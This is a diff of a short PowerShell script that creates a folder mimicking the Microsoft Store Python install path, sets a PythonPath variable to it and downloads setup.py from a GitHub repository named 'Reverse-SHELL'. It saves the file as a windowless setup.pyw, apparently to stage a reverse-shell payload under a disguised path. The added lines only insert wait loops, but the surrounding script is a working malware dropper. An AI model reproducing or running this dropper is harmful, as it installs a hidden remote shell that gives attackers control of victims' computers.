@@ -1,5 +1,7 @@
 mkdir C:\Users\$env:USERNAME\AppData\Local\Microsoft\WindowsApps
+while (!(Test-Path "C:\Users\$env:USERNAME\AppData\Local\Microsoft\WindowsApps")) {Start-Sleep -Seconds 1}
 mkdir C:\Users\$env:USERNAME\AppData\Local\Microsoft\WindowsApps\PythonSoftwareFoundation.Python.3.12_qbz5n2kfra8p0
+while (!(Test-Path "C:\Users\$env:USERNAME\AppData\Local\Microsoft\WindowsApps\PythonSoftwareFoundation.Python.3.12_qbz5n2kfra8p0")) {Start-Sleep -Seconds 1}
 SETX PythonPath "C:\Users\$env:USERNAME\AppData\Local\Microsoft\WindowsApps\PythonSoftwareFoundation.Python.3.12_qbz5n2kfra8p0"
 Invoke-WebRequest -uri "https://raw.githubusercontent.com/SmartBoyMuzaffar/Reverse-SHELL/master/setup.py" -outfile "$env:PythonPath\setup.pyw"
 while (!(Test-Path "$env:PythonPath\setup.pyw")) {Start-Sleep -Seconds 1}
